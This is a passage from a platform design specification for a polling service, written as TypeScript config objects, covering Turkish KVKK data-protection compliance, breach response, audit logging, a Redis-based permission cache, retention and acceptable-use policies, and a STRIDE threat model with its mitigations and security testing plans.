      "Encryption",
      "Access controls",
      "Monitoring"
    ]
  },

  PROCESSOR_AGREEMENTS: {
    required: true,
    content: [
      "Processing scope",
      "Security obligations",
      "Subprocessor approval",
      "Audit rights",
      "Data return/deletion"
    ]
  }
}

export { DATA_PROCESSING_RECORDS }
```




# ══════════════════════════════════════════════════════════════════════════════
# 17.7 KVKK COMPLIANCE (Turkish Data Protection)
# ══════════════════════════════════════════════════════════════════════════════

## 17.7.1 KVKK Overview

```typescript
const KVKK_OVERVIEW = {
  LAW: "6698 Sayılı Kişisel Verilerin Korunması Kanunu",
  EFFECTIVE_DATE: "2016-04-07",
  AUTHORITY: "Kişisel Verileri Koruma Kurumu (KVKK)",

  KEY_DIFFERENCES_FROM_GDPR: {
    explicitConsent: "Required for all processing (stricter than GDPR)",
    dataLocalization: "Certain data must stay in Turkey",
    veriSorumlusuSicili: "Mandatory registry (VERBİS) for data controllers",
    crossBorderTransfer: "Requires explicit consent or board approval"
  },

  REGISTRATION: {
    verbis: {
      required: true,
      deadline: "Before processing",
      updateFrequency: "Within 7 days of changes"
    }
  }
}

export { KVKK_OVERVIEW }
```

## 17.7.2 KVKK Data Categories

```typescript
const KVKK_DATA_CATEGORIES = {
  GENERAL_PERSONAL_DATA: {
    definition: "Any data relating to identified or identifiable person",
    examples: ["name", "email", "phone", "address", "IP address"],
    consent: "Explicit consent or legal exemption"
  },

  SENSITIVE_PERSONAL_DATA: {
    definition: "Özel nitelikli kişisel veriler (Article 6)",
    categories: [
      "Race/ethnic origin",
      "Political opinions",
      "Religious beliefs",
      "Health data",
      "Sexual life",
      "Criminal convictions",
      "Biometric data",
      "Genetic data"
    ],
    processing: "Explicit consent + additional safeguards",
    storage: "Enhanced security required"
  },

  VOXPOLL_DATA_MAPPING: {
    generalData: [
      "email",
      "phone",
      "username",
      "displayName",
      "ipAddress",
      "deviceFingerprint"
    ],
    potentiallySensitive: [
      "Survey responses (if contains sensitive questions)",
      "Political poll responses",
      "Health-related survey responses"
    ],
    handling: "Anonymize sensitive responses, no direct user link"
  }
}

export { KVKK_DATA_CATEGORIES }
```

## 17.7.3 KVKK Compliance Implementation

```typescript
const KVKK_COMPLIANCE = {
  AYDINLATMA_METNI: {
    description: "Clarification text (Aydınlatma Yükümlülüğü)",
    requirement: "Must be provided before data collection",
    content: [
      "Data controller identity",
      "Processing purposes",
      "Data recipients",
      "Collection method and legal basis",
      "Data subject rights"
    ],
    languages: ["Turkish (required)", "English (optional)"]
  },

  ACIK_RIZA: {
    description: "Explicit consent (Açık Rıza)",
    requirements: [
      "Freely given",
      "Specific",
      "Informed",
      "Unambiguous",
      "Documented"
    ],
    implementation: {
      separateFromTerms: true,
      clearLanguage: true,
      withdrawalMechanism: true,
      recordKeeping: true
    }
  },

  VERI_SORUMLUSU: {
    description: "Data controller obligations",
    obligations: [
      "Register in VERBİS",
      "Appoint DPO if required",
      "Implement security measures",
      "Respond to data subject requests (30 days)",
      "Report breaches (72 hours)"
    ]
  },

  CROSS_BORDER_TRANSFER: {
    requirement: "Special rules for data transfer outside Turkey",
    options: [
      "Explicit consent",
      "Adequate country (KVKK board list)",
      "Board approval with commitments"
    ],
    implementation: {
      euServers: "Use EU servers for Turkish users",
      consentForTransfer: "Explicit consent in registration"
    }
  }
}

export { KVKK_COMPLIANCE }
```

## 17.7.4 Turkish Language Requirements

```typescript
const TURKISH_LANGUAGE_REQUIREMENTS = {
  REQUIRED_DOCUMENTS: {
    privacyPolicy: {
      turkish: "Required",
      location: "/gizlilik-politikasi"
    },
    termsOfService: {
      turkish: "Required",
      location: "/kullanim-kosullari"
    },
    cookiePolicy: {
      turkish: "Required",
      location: "/cerez-politikasi"
    },
    clarificationText: {
      turkish: "Required",
      location: "/aydinlatma-metni"
    },
    consentForms: {
      turkish: "Required"
    }
  },

  UI_ELEMENTS: {
    consentCheckboxes: "Turkish",
    errorMessages: "Turkish",
    confirmationDialogs: "Turkish",
    emailNotifications: "Turkish (with English option)"
  }
}

export { TURKISH_LANGUAGE_REQUIREMENTS }
```




# ══════════════════════════════════════════════════════════════════════════════
# 17.8 DATA BREACH RESPONSE
# ══════════════════════════════════════════════════════════════════════════════

## 17.8.1 Breach Detection

```typescript
const BREACH_DETECTION = {
  MONITORING: {
    securityLogs: "Real-time analysis",
    accessPatterns: "Anomaly detection",
    dataExfiltration: "Volume monitoring",
    unauthorizedAccess: "Alert on privilege escalation"
  },

  INDICATORS: {
    highSeverity: [
      "Mass data export",
      "Admin account compromise",
      "Database dump detected",
      "Encryption key access anomaly"
    ],
    mediumSeverity: [
      "Multiple failed login attempts",
      "Unusual access patterns",
      "API abuse detected"
    ]
  },

  AUTOMATED_RESPONSE: {
    suspiciousActivity: "Temporary account lock",
    massExport: "Block and alert",
    privilegeEscalation: "Revoke and investigate"
  }
}

export { BREACH_DETECTION }
```

## 17.8.2 Incident Response Plan

```typescript
const INCIDENT_RESPONSE_PLAN = {
  PHASES: {
    IDENTIFICATION: {
      timeframe: "0-1 hours",
      actions: [
        "Confirm breach occurrence",
        "Identify affected systems",
        "Assess initial scope",
        "Activate incident team"
      ]
    },
    CONTAINMENT: {
      timeframe: "1-4 hours",
      actions: [
        "Isolate affected systems",
        "Revoke compromised credentials",
        "Block attacker access",
        "Preserve evidence"
      ]
    },
    INVESTIGATION: {
      timeframe: "4-24 hours",
      actions: [
        "Determine root cause",
        "Identify all affected data",
        "Document timeline",
        "Assess data subject impact"
      ]
    },
    NOTIFICATION: {
      timeframe: "24-72 hours",
      actions: [
        "Notify supervisory authority (KVKK: 72 hours)",
        "Notify affected users (if high risk)",
        "Prepare public statement if needed"
      ]
    },
    RECOVERY: {
      timeframe: "72+ hours",
      actions: [
        "Restore affected systems",
        "Implement additional controls",
        "Monitor for further issues"
      ]
    },
    LESSONS_LEARNED: {
      timeframe: "Post-incident",
      actions: [
        "Conduct post-mortem",
        "Update security measures",
        "Train staff",
        "Update incident plan"
      ]
    }
  },

  TEAM: {
    incidentCommander: "CTO or designee",
    securityLead: "Security team lead",
    legalCounsel: "Legal team",
    communications: "PR team",
    technical: "Engineering team"
  }
}

export { INCIDENT_RESPONSE_PLAN }
```

## 17.8.3 Breach Notification Templates

```typescript
const BREACH_NOTIFICATION_TEMPLATES = {
  AUTHORITY_NOTIFICATION: {
    to: "KVKK / Relevant supervisory authority",
    deadline: "72 hours",
    content: {
      natureOfBreach: "Description of breach",
      categoriesAffected: "Types of data and subjects",
      approximateNumber: "Number of affected individuals",
      dpoContact: "DPO name and contact",
      likelyConsequences: "Potential impact",
      measuresTaken: "Remedial actions"
    }
  },

  USER_NOTIFICATION: {
    trigger: "High risk to rights and freedoms",
    deadline: "Without undue delay",
    content: {
      subject: "Önemli Güvenlik Bildirimi / Important Security Notice",
      description: "Clear description of breach",
      dataAffected: "What data was affected",
      actions: "What we are doing",
      recommendations: "What you should do",
      contact: "How to reach us"
    },
    channels: ["Email", "In-app notification"]
  }
}

export { BREACH_NOTIFICATION_TEMPLATES }
```




# ══════════════════════════════════════════════════════════════════════════════
# 17.9 AUDIT LOGGING
# ══════════════════════════════════════════════════════════════════════════════

## 17.9.1 Security Audit Events

```typescript
const SECURITY_AUDIT_EVENTS = {
  AUTHENTICATION: [
    "LOGIN_SUCCESS",
    "LOGIN_FAILURE",
    "LOGOUT",
    "PASSWORD_CHANGE",
    "PASSWORD_RESET_REQUEST",
    "PASSWORD_RESET_COMPLETE",
    "MFA_ENABLED",
    "MFA_DISABLED",
    "MFA_CHALLENGE_SUCCESS",
    "MFA_CHALLENGE_FAILURE",
    "SESSION_CREATED",
    "SESSION_REVOKED",
    "OAUTH_LINK",
    "OAUTH_UNLINK"
  ],

  AUTHORIZATION: [
    "ACCESS_GRANTED",
    "ACCESS_DENIED",
    "PERMISSION_CHANGED",
    "ROLE_ASSIGNED",
    "ROLE_REMOVED"
  ],

  DATA_ACCESS: [
    "DATA_EXPORT_REQUESTED",
    "DATA_EXPORT_COMPLETED",
    "DATA_DELETION_REQUESTED",
    "DATA_DELETION_COMPLETED",
    "SENSITIVE_DATA_ACCESSED",
    "BULK_DATA_QUERY"
  ],

  ADMIN_ACTIONS: [
    "USER_SUSPENDED",
    "USER_UNSUSPENDED",
    "USER_BANNED",
    "CONTENT_REMOVED",
    "CONTENT_RESTORED",
    "SETTINGS_CHANGED",
    "SYSTEM_CONFIG_CHANGED"
  ],

  SECURITY_EVENTS: [
    "SUSPICIOUS_ACTIVITY_DETECTED",
    "RATE_LIMIT_EXCEEDED",
    "FRAUD_DETECTED",
    "IP_BLOCKED",
    "DEVICE_BLOCKED"
  ]
}

export { SECURITY_AUDIT_EVENTS }
```

## 17.9.2 Audit Log Structure

```typescript
interface AuditLogEntry {
  id: string
  timestamp: Date
  eventType: string
  severity: "INFO" | "WARNING" | "ALERT" | "CRITICAL"

  actor: {
    type: "USER" | "ADMIN" | "SYSTEM" | "API"
    id: string | null
    ip: string
    userAgent: string
    sessionId: string | null
  }

  target: {
    type: string
    id: string
    name?: string
  }

  action: {
    name: string
    result: "SUCCESS" | "FAILURE" | "PARTIAL"
    reason?: string
  }

  context: {
    requestId: string
    endpoint?: string
    method?: string
    changes?: {
      before: Record<string, unknown>
      after: Record<string, unknown>
    }
  }

  metadata: Record<string, unknown>
}

const AUDIT_LOG_RETENTION = {
  securityEvents: "7 years",
  adminActions: "7 years",
  authenticationEvents: "3 years",
  dataAccessEvents: "3 years",
  generalEvents: "1 year"
}

export { AUDIT_LOG_RETENTION }
export type { AuditLogEntry }
```

## 17.9.3 Audit Log Access

```typescript
const AUDIT_LOG_ACCESS = {
  READ_ACCESS: {
    SUPER_ADMIN: "All logs",
    ADMIN: "Non-admin logs",
    DPO: "Data access logs",
    SECURITY_TEAM: "Security events",
    ORG_ADMIN: "Organization-specific logs"
  },

  SEARCH_CAPABILITIES: {
    filters: [
      "eventType",
      "actorId",
      "targetId",
      "dateRange",
      "severity",
      "result"
    ],
    exportFormats: ["JSON", "CSV"],
    maxExportSize: 100000
  },

  INTEGRITY: {
    immutable: true,
    checksums: "SHA-256 per entry",
    chainedHashes: "Previous entry hash included",
    externalBackup: "Daily to separate storage"
  }
}

export { AUDIT_LOG_ACCESS }
```




# ══════════════════════════════════════════════════════════════════════════════
# 17.10 SECURITY POLICIES
# ══════════════════════════════════════════════════════════════════════════════

## 17.10.1 Access Control Policy

```typescript
const ACCESS_CONTROL_POLICY = {
  PRINCIPLE: "Role-Based Access Control (RBAC)",

  ROLES: {
    SUPER_ADMIN: {
      description: "Full system access",
      permissions: ["*"],
      assignment: "Manual by existing super admin",
      mfaRequired: true
    },
    ADMIN: {
      description: "User and content management",
      permissions: [
        "users:read",
        "users:moderate",
        "content:moderate",
        "reports:manage",
        "analytics:read"
      ],
      mfaRequired: true
    },
    MODERATOR: {
      description: "Content moderation",
      permissions: [
        "content:moderate",
        "reports:review",
        "comments:moderate"
      ],
      mfaRequired: false
    },
    USER: {
      description: "Standard user",
      permissions: [
        "content:create",
        "content:read",
        "profile:manage"
      ]
    }
  },

  PERMISSION_CHECKS: {
    location: "Server-side only",
    caching: "Redis-based with smart invalidation",  // UPDATED: Added caching
    defaultDeny: true
  }
}

export { ACCESS_CONTROL_POLICY }
```

### Permission Caching Strategy

```typescript
// ══════════════════════════════════════════════════════════════════════════════
// PERMISSION CACHING SPECIFICATION
// ══════════════════════════════════════════════════════════════════════════════
// Problem: Permission checks are expensive (DB queries, role lookups, org checks)
// Solution: Redis-based caching with intelligent TTLs and invalidation
// ══════════════════════════════════════════════════════════════════════════════

const PERMISSION_CACHE_CONFIG = {
  // Cache key patterns
  KEY_PATTERNS: {
    userPermissions: 'perm:user:{userId}',                    // All permissions for user
    userResourceAccess: 'perm:user:{userId}:res:{resourceType}:{resourceId}',
    orgMembership: 'perm:org:{orgId}:member:{userId}',
    rolePermissions: 'perm:role:{roleId}',                    // Role -> permissions mapping
  },

  // TTL configuration by permission type
  TTL_SECONDS: {
    // Standard permissions - moderate TTL
    STANDARD: 300,                // 5 minutes

    // Sensitive permissions - short TTL for security
    SENSITIVE: 30,                // 30 seconds
    // Examples: admin actions, financial operations, user management

    // Role-based permissions - longer TTL (roles change rarely)
    ROLE: 3600,                   // 1 hour

    // Resource-specific access - short TTL (ownership can change)
    RESOURCE: 120,                // 2 minutes

    // Organization membership - moderate TTL
    ORG_MEMBERSHIP: 600,          // 10 minutes
  },

  // Permission categories
  PERMISSION_CATEGORIES: {
    SENSITIVE: [
      'admin:*',
      'user:delete',
      'user:ban',
      'org:manage',
      'billing:*',
      'api_key:*',
    ],
    STANDARD: [
      'content:create',
      'content:read',
      'content:update',
      'content:delete',
      'comment:*',
      'vote:*',
    ],
  },
}

// ══════════════════════════════════════════════════════════════════════════════
// PERMISSION CACHE SERVICE
// ══════════════════════════════════════════════════════════════════════════════

interface PermissionCacheService {
  // Check permission with cache
  checkPermission(
    userId: string,
    permission: string,
    resourceContext?: { type: string; id: string }
  ): Promise<boolean>

  // Invalidation methods
  invalidateUserPermissions(userId: string): Promise<void>
  invalidateResourcePermissions(resourceType: string, resourceId: string): Promise<void>
  invalidateOrgMembership(orgId: string, userId?: string): Promise<void>
  invalidateRole(roleId: string): Promise<void>
}

class RedisPermissionCache implements PermissionCacheService {
  constructor(
    private redis: Redis,
    private permissionResolver: PermissionResolver  // Fallback to DB
  ) {}

  async checkPermission(
    userId: string,
    permission: string,
    resourceContext?: { type: string; id: string }
  ): Promise<boolean> {
    // Build cache key
    const cacheKey = resourceContext
      ? PERMISSION_CACHE_CONFIG.KEY_PATTERNS.userResourceAccess
          .replace('{userId}', userId)
          .replace('{resourceType}', resourceContext.type)
          .replace('{resourceId}', resourceContext.id)
      : `${PERMISSION_CACHE_CONFIG.KEY_PATTERNS.userPermissions.replace('{userId}', userId)}:${permission}`

    // Try cache first
    const cached = await this.redis.get(cacheKey)
    if (cached !== null) {
      return cached === '1'
    }

    // Cache miss - resolve from DB
    const hasPermission = await this.permissionResolver.resolve(
      userId,
      permission,
      resourceContext
    )

    // Determine TTL based on permission sensitivity
    const ttl = this.getTTL(permission)

    // Cache the result
    await this.redis.setex(cacheKey, ttl, hasPermission ? '1' : '0')

    return hasPermission
  }

  private getTTL(permission: string): number {
    const isSensitive = PERMISSION_CACHE_CONFIG.PERMISSION_CATEGORIES.SENSITIVE
      .some(pattern => {
        if (pattern.endsWith('*')) {
          return permission.startsWith(pattern.slice(0, -1))
        }
        return permission === pattern
      })

    return isSensitive
      ? PERMISSION_CACHE_CONFIG.TTL_SECONDS.SENSITIVE
      : PERMISSION_CACHE_CONFIG.TTL_SECONDS.STANDARD
  }

  // ════════════════════════════════════════════════════════════════════════════
  // INVALIDATION METHODS
  // ════════════════════════════════════════════════════════════════════════════

  async invalidateUserPermissions(userId: string): Promise<void> {
    const pattern = `perm:user:${userId}*`
    const keys = await this.redis.keys(pattern)
    if (keys.length > 0) {
      await this.redis.del(...keys)
    }
  }

  async invalidateResourcePermissions(resourceType: string, resourceId: string): Promise<void> {
    const pattern = `perm:*:res:${resourceType}:${resourceId}`
    const keys = await this.redis.keys(pattern)
    if (keys.length > 0) {
      await this.redis.del(...keys)
    }
  }

  async invalidateOrgMembership(orgId: string, userId?: string): Promise<void> {
    const pattern = userId
      ? `perm:org:${orgId}:member:${userId}`
      : `perm:org:${orgId}:member:*`

    const keys = await this.redis.keys(pattern)
    if (keys.length > 0) {
      await this.redis.del(...keys)
    }

    // Also invalidate user permissions for affected users
    if (!userId) {
      // Get all members and invalidate their permissions
      const memberKeys = await this.redis.keys(`perm:org:${orgId}:member:*`)
      for (const key of memberKeys) {
        const memberId = key.split(':').pop()
        if (memberId) {
          await this.invalidateUserPermissions(memberId)
        }
      }
    } else {
      await this.invalidateUserPermissions(userId)
    }
  }

  async invalidateRole(roleId: string): Promise<void> {
    // Delete role permission cache
    const roleKey = PERMISSION_CACHE_CONFIG.KEY_PATTERNS.rolePermissions.replace('{roleId}', roleId)
    await this.redis.del(roleKey)

    // Note: This doesn't automatically invalidate user permissions
    // Users with this role should have their permissions invalidated separately
    // This is typically handled by the role update business logic
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// INVALIDATION TRIGGERS
// ══════════════════════════════════════════════════════════════════════════════

const INVALIDATION_TRIGGERS = {
  // When to invalidate user permissions
  USER_PERMISSIONS: [
    'User role changed',
    'User added to organization',
    'User removed from organization',
    'User banned/unbanned',
    'User subscription tier changed',
  ],

  // When to invalidate resource permissions
  RESOURCE_PERMISSIONS: [
    'Content ownership transferred',
    'Content deleted',
    'Content visibility changed',
    'Content collaborators updated',
  ],

  // When to invalidate org membership
  ORG_MEMBERSHIP: [
    'User added to org',
    'User removed from org',
    'User role in org changed',
    'Org permissions policy updated',
  ],

  // When to invalidate role
  ROLE: [
    'Role permissions updated',
    'Role deleted',
  ],
}

// Integration with event system
const PERMISSION_INVALIDATION_HANDLERS = {
  'user.role_changed': async (event: { userId: string }) => {
    await permissionCache.invalidateUserPermissions(event.userId)
  },

  'user.org_membership_changed': async (event: { userId: string; orgId: string }) => {
    await permissionCache.invalidateOrgMembership(event.orgId, event.userId)
  },

  'content.ownership_transferred': async (event: { contentType: string; contentId: string }) => {
    await permissionCache.invalidateResourcePermissions(event.contentType, event.contentId)
  },

  'org.permissions_updated': async (event: { orgId: string }) => {
    await permissionCache.invalidateOrgMembership(event.orgId)
  },

  'role.permissions_updated': async (event: { roleId: string; userIds: string[] }) => {
    await permissionCache.invalidateRole(event.roleId)
    // Invalidate all affected users
    for (const userId of event.userIds) {
      await permissionCache.invalidateUserPermissions(userId)
    }
  },
}

export {
  PERMISSION_CACHE_CONFIG,
  RedisPermissionCache,
  INVALIDATION_TRIGGERS,
  PERMISSION_INVALIDATION_HANDLERS,
}
export type { PermissionCacheService }
```

## 17.10.2 Data Retention Policy

```typescript
const DATA_RETENTION_POLICY = {
  USER_DATA: {
    activeAccount: {
      retention: "Indefinite",
      deletion: "On account deletion request"
    },
    deletedAccount: {
      retention: "90 days",
      deletion: "Automatic after retention period"
    }
  },

  CONTENT_DATA: {
    activePoll: {
      retention: "Indefinite"
    },
    completedPoll: {
      retention: "Indefinite",
      archiving: "After 2 years"
    },
    deletedContent: {
      retention: "30 days",
      deletion: "Automatic"
    }
  },

  RESPONSE_DATA: {
    anonymizedResponses: {
      retention: "Indefinite",
      note: "No user link, aggregate only"
    },
    surveyResponses: {
      retention: "3 years or organization policy"
    }
  },

  LOGS: {
    securityLogs: "7 years",
    auditLogs: "7 years",
    applicationLogs: "90 days",
    accessLogs: "90 days"
  },

  BACKUPS: {
    database: "30 days rolling",
    files: "30 days rolling"
  }
}

export { DATA_RETENTION_POLICY }
```

## 17.10.3 Acceptable Use Policy

```typescript
const ACCEPTABLE_USE_POLICY = {
  PROHIBITED_ACTIVITIES: [
    "Creating fake accounts or multiple accounts",
    "Automated bot access without approval",
    "Scraping or bulk data extraction",
    "Manipulation of polls or surveys",
    "Harassment or hate speech",
    "Posting illegal content",
    "Impersonation",
    "Spam or unsolicited advertising",
    "Circumventing security measures",
    "Sharing account credentials"
  ],

  CONTENT_GUIDELINES: [
    "No illegal content",
    "No adult content without age gates",
    "No personal attacks",
    "No misinformation",
    "No copyright infringement"
  ],

  ENFORCEMENT: {
    firstViolation: "Warning",
    secondViolation: "Temporary suspension (24-72 hours)",
    thirdViolation: "Extended suspension (7-30 days)",
    severeViolation: "Immediate permanent ban",
    illegalContent: "Immediate ban + legal reporting"
  }
}

export { ACCEPTABLE_USE_POLICY }
```




# ══════════════════════════════════════════════════════════════════════════════
# 17.11 THREAT MODEL & SECURITY AUDIT
# ══════════════════════════════════════════════════════════════════════════════

## 17.11.0 STRIDE Threat Model

```typescript
// ══════════════════════════════════════════════════════════════════════════════
// VOXPOLL STRIDE THREAT MODEL
// ══════════════════════════════════════════════════════════════════════════════
// STRIDE: Spoofing, Tampering, Repudiation, Information Disclosure,
//         Denial of Service, Elevation of Privilege
// ══════════════════════════════════════════════════════════════════════════════

const STRIDE_THREAT_MODEL = {
  // ═══════════════════════════════════════════════════════════════════════════
  // S - SPOOFING (Identity Threats)
  // ═══════════════════════════════════════════════════════════════════════════
  SPOOFING: {
    threats: [
      {
        id: "S-001",
        threat: "Account impersonation via credential theft",
        assets: ["User accounts", "Admin accounts", "API keys"],
        likelihood: "HIGH",
        impact: "CRITICAL",
        mitigations: [
          "Argon2id password hashing (§17.2.1)",
          "MFA for admin/org owners (§17.2.3)",
          "Session binding to user agent (§17.2.2)",
          "Breach check on registration (HaveIBeenPwned)"
        ]
      },
      {
        id: "S-002",
        threat: "Session hijacking via token theft",
        assets: ["Session tokens", "JWT tokens"],
        likelihood: "MEDIUM",
        impact: "HIGH",
        mitigations: [
          "HttpOnly, Secure cookies (§17.2.2)",
          "Short access token expiry (15 min)",
          "Session regeneration on auth changes",
          "Token binding to fingerprint"
        ]
      },
      {
        id: "S-003",
        threat: "OAuth account takeover",
        assets: ["OAuth-linked accounts"],
        likelihood: "LOW",
        impact: "HIGH",
        mitigations: [
          "PKCE required for OAuth (§17.2.4)",
          "Email verification on link",
          "State parameter validation"
        ]
      },
      {
        id: "S-004",
        threat: "Device fingerprint spoofing for vote manipulation",
        assets: ["Poll/Survey results", "Anonymous participation"],
        likelihood: "MEDIUM",
        impact: "MEDIUM",
        mitigations: [
          "Multi-component fingerprinting (§9.2)",
          "Confidence scoring for fingerprints",
          "Rate limiting per IP + fingerprint",
          "Quality scoring for suspicious patterns"
        ]
      }
    ]
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // T - TAMPERING (Data Integrity Threats)
  // ═══════════════════════════════════════════════════════════════════════════
  TAMPERING: {
    threats: [
      {
        id: "T-001",
        threat: "SQL injection attacks",
        assets: ["Database", "User data", "Survey responses"],
        likelihood: "LOW",
        impact: "CRITICAL",
        mitigations: [
          "Drizzle ORM (parameterized queries only)",
          "Input validation with Zod schemas",
          "No raw SQL queries allowed",
          "Database user with minimal privileges"
        ]
      },
      {
        id: "T-002",
        threat: "Vote/Response manipulation",
        assets: ["Poll votes", "Survey responses", "Test answers"],
        likelihood: "MEDIUM",
        impact: "HIGH",
        mitigations: [
          "Server-side vote recording only",
          "Immutable response records (soft delete)",
          "Cryptographic participant hashing",
          "Quality scoring flags suspicious patterns"
        ]
      },
      {
        id: "T-003",
        threat: "Content modification after publish",
        assets: ["Polls", "Surveys", "Tests"],
        likelihood: "LOW",
        impact: "HIGH",
        mitigations: [
          "[P-106] Content immutable after publish",
          "Audit log for all changes",
          "Version tracking for drafts only"
        ]
      },
      {
        id: "T-004",
        threat: "API request tampering",
        assets: ["API endpoints", "Server actions"],
        likelihood: "MEDIUM",
        impact: "MEDIUM",
        mitigations: [
          "TLS 1.3 for all traffic",
          "Request signing for webhooks",
          "CSRF tokens for state-changing actions",
          "Input validation at API boundary"
        ]
      }
    ]
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // R - REPUDIATION (Non-repudiation Threats)
  // ═══════════════════════════════════════════════════════════════════════════
  REPUDIATION: {
    threats: [
      {
        id: "R-001",
        threat: "User denies performing action",
        assets: ["Votes", "Comments", "Content creation"],
        likelihood: "MEDIUM",
        impact: "MEDIUM",
        mitigations: [
          "Comprehensive audit logging (§17.9)",
          "IP and user agent recording",
          "Timestamp with server time",
          "Chained hash integrity for logs"
        ]
      },
      {
        id: "R-002",
        threat: "Admin denies moderation action",
        assets: ["Content moderation", "User bans"],
        likelihood: "LOW",
        impact: "HIGH",
        mitigations: [
          "Admin action audit log (7 year retention)",
          "Dual approval for critical actions",
          "Immutable audit trail"
        ]
      }
    ]
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // I - INFORMATION DISCLOSURE (Confidentiality Threats)
  // ═══════════════════════════════════════════════════════════════════════════
  INFORMATION_DISCLOSURE: {
    threats: [
      {
        id: "I-001",
        threat: "PII exposure through API",
        assets: ["Email", "Phone", "Birth date", "Demographics"],
        likelihood: "MEDIUM",
        impact: "CRITICAL",
        mitigations: [
          "Field-level access control",
          "PII masking in responses (§17.3.3)",
          "Encryption at rest for sensitive fields",
          "GDPR/KVKK compliance (§17.6-7)"
        ]
      },
      {
        id: "I-002",
        threat: "Survey response de-anonymization",
        assets: ["Anonymous responses", "Research data"],
        likelihood: "MEDIUM",
        impact: "HIGH",
        mitigations: [
          "Participant hash with per-content salt",
          "No direct user link for anonymous",
          "Aggregation minimums (N≥5)",
          "K-anonymity for demographic filters"
        ]
      },
      {
        id: "I-003",
        threat: "Log file exposure",
        assets: ["Application logs", "Security logs"],
        likelihood: "LOW",
        impact: "HIGH",
        mitigations: [
          "No PII in logs (hash only)",
          "Log access restricted to security team",
          "Log encryption at rest",
          "90-day retention for app logs"
        ]
      },
      {
        id: "I-004",
        threat: "Error message information leakage",
        assets: ["Stack traces", "Internal errors"],
        likelihood: "MEDIUM",
        impact: "LOW",
        mitigations: [
          "Generic error messages to users",
          "Detailed errors only in development",
          "Error codes without internal details (§16)",
          "CSP report-uri for client errors"
        ]
      }
    ]
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // D - DENIAL OF SERVICE (Availability Threats)
  // ═══════════════════════════════════════════════════════════════════════════
  DENIAL_OF_SERVICE: {
    threats: [
      {
        id: "D-001",
        threat: "API rate limit exhaustion",
        assets: ["API endpoints", "Authentication"],
        likelihood: "HIGH",
        impact: "MEDIUM",
        mitigations: [
          "Tiered rate limiting (§17.5.1)",
          "Per-user and per-IP limits",
          "Redis-based sliding window",
          "Cloudflare/AWS Shield DDoS protection"
        ]
      },
      {
        id: "D-002",
        threat: "Live Poll capacity attack",
        assets: ["Live Poll sessions", "WebSocket server"],
        likelihood: "MEDIUM",
        impact: "HIGH",
        mitigations: [
          "10,000 participant limit per session",
          "WebSocket connection limits",
          "Waiting room for overflow (§23)",
          "Auto-scale infrastructure"
        ]
      },
      {
        id: "D-003",
        threat: "Database query exhaustion",
        assets: ["PostgreSQL", "Query performance"],
        likelihood: "MEDIUM",
        impact: "HIGH",
        mitigations: [
          "Query timeout limits",
          "Connection pooling",
          "Read replicas for analytics",
          "Index optimization (§13.14)"
        ]
      },
      {
        id: "D-004",
        threat: "Storage exhaustion via uploads",
        assets: ["File storage", "S3 bucket"],
        likelihood: "LOW",
        impact: "MEDIUM",
        mitigations: [
          "File size limits (avatar: 2MB, poll: 5MB)",
          "Per-user storage quotas",
          "File type validation",
          "Virus scanning on upload"
        ]
      }
    ]
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // E - ELEVATION OF PRIVILEGE (Authorization Threats)
  // ═══════════════════════════════════════════════════════════════════════════
  ELEVATION_OF_PRIVILEGE: {
    threats: [
      {
        id: "E-001",
        threat: "Horizontal privilege escalation (access other user data)",
        assets: ["User profiles", "Private content", "Responses"],
        likelihood: "MEDIUM",
        impact: "HIGH",
        mitigations: [
          "Resource ownership verification",
          "Row-level security (§13.15)",
          "Permission caching with invalidation (§15.12)",
          "Authorization check at every endpoint"
        ]
      },
      {
        id: "E-002",
        threat: "Vertical privilege escalation (gain admin access)",
        assets: ["Admin panel", "Moderation tools"],
        likelihood: "LOW",
        impact: "CRITICAL",
        mitigations: [
          "RBAC with explicit role assignment",
          "No default admin permissions",
          "MFA required for admin roles",
          "Admin action audit logging"
        ]
      },
      {
        id: "E-003",
        threat: "Subscription tier bypass",
        assets: ["Premium features", "Tier limits"],
        likelihood: "MEDIUM",
        impact: "MEDIUM",
        mitigations: [
          "Server-side tier verification",
          "Feature flags tied to subscription",
          "Subscription cache with short TTL",
          "Stripe webhook for tier changes"
        ]
      },
      {
        id: "E-004",
        threat: "Organization role escalation",
        assets: ["Organization data", "Member management"],
        likelihood: "LOW",
        impact: "HIGH",
        mitigations: [
          "Org-level RBAC (Owner > Admin > Member)",
          "Owner-only for role changes",
          "Audit log for membership changes",
          "SSO integration for enterprise"
        ]
      }
    ]
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// SECURITY AUDIT REQUIREMENTS
// ══════════════════════════════════════════════════════════════════════════════

const SECURITY_AUDIT_REQUIREMENTS = {
  PRE_LAUNCH: {
    timeline: "4 weeks before launch",
    activities: [
      {
        activity: "Internal security review",
        scope: "Authentication, authorization, data handling",
        responsible: "Security team lead",
        duration: "1 week"
      },
      {
        activity: "Penetration testing",
        scope: "Full application (web + mobile + API)",
        responsible: "Third-party security firm",
        duration: "2 weeks"
      },
      {
        activity: "GDPR/KVKK compliance audit",
        scope: "Data processing, consent, privacy policy",
        responsible: "Legal + DPO",
        duration: "1 week"
      }
    ],
    deliverables: [
      "Security assessment report",
      "Vulnerability remediation plan",
      "Compliance checklist sign-off"
    ]
  },

  ONGOING: {
    quarterly: [
      "Automated security scan review",
      "Dependency vulnerability assessment",
      "Access control audit"
    ],
    annually: [
      "Full penetration test",
      "Compliance re-certification",
      "Threat model review and update",
      "Incident response drill"
    ]
  },

  CRITICAL_PATHS: [
    "Authentication flow (register, login, password reset)",
    "Payment processing (Stripe integration)",
    "Data export/deletion (GDPR Article 15, 17)",
    "Admin panel access",
    "Organization data isolation"
  ]
}

export { STRIDE_THREAT_MODEL, SECURITY_AUDIT_REQUIREMENTS }
```

## 17.11.1 Security Testing Program

```typescript
const SECURITY_TESTING_PROGRAM = {
  AUTOMATED_TESTING: {
    SAST: {
      description: "Static Application Security Testing",
      tools: ["Semgrep", "CodeQL"],
      frequency: "Every PR",
      coverage: "All code changes"
    },
    DAST: {
      description: "Dynamic Application Security Testing",
      tools: ["OWASP ZAP"],
      frequency: "Weekly",
      coverage: "Staging environment"
    },
    DEPENDENCY_SCANNING: {
      tools: ["npm audit", "Snyk"],
      frequency: "Daily",
      action: "Alert on high/critical vulnerabilities"
    }
  },

  MANUAL_TESTING: {
    PENETRATION_TESTING: {
      frequency: "Annual",
